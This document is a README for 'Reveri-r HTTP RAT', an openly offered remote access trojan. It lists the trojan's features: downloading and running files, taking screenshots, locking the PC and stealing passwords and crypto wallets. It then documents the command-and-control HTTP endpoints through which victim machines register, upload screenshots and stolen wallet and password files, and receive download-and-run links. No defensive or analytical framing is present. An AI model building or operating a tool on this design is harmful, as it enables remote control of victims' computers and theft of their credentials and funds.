
# Reveri-r HTTP RAT




## Features

- Download file & Run
- Get Screenshot
- Lock Pc
- Get Passwords & Wallet

  
## API Usage


#### POST New PC

```http
  POST /api/reg.php
```

| Parametre | Tip     | Açıklama                |
| :-------- | :------- | :------------------------- |
| `actionID` | `string` | **Required**. API Key. |





#### Get Pc Data

```http
  POST /api/get.php
```

| Parametre | Tip     | Açıklama                |
| :-------- | :------- | :------------------------- |
| `actionID` | `string` | **Required**. API Key. |

#### POST Screenshot

```http
  POST /api/getss.php
```

| Parametre | Tip     | Açıklama                |
| :-------- | :------- | :------------------------- |
| `actionID` | `string` | **Required**. API Key. |
| `screenshot` | `string` | **Required**. File Link. |

```http
  POST /api/getss.php
```

| Parametre | Tip     | Açıklama                |
| :-------- | :------- | :------------------------- |
| `actionID` | `string` | **Required**. API Key. |
| `screenshot` | `string` | **Required**. File Link. |

#### POST Wallet & Password

```http
  POST /api/wp.php
```

| Parametre | Tip     | Açıklama                |
| :-------- | :------- | :------------------------- |
| `actionID` | `string` | **Required**. API Key. |
| `wallet` | `string` | **Required**. File Link. |
| `password` | `string` | **Required**. File Link. |

#### POST Download File & Run

```http
  POST /api/downloadLink.php
```

| Parametre | Tip     | Açıklama                |
| :-------- | :------- | :------------------------- |
| `id` | `string` | **Required**. API Key. |
| `externalDownload` | `string` | **Required**. File Link. |


## Screenshots

![ss](https://img001.prntscr.com/file/img001/q1JVCse-QWycOBl7xxpDTA.png)

![ss](https://img001.prntscr.com/file/img001/twZ5XNz1QZK-6N9TudJ7fg.png)

  
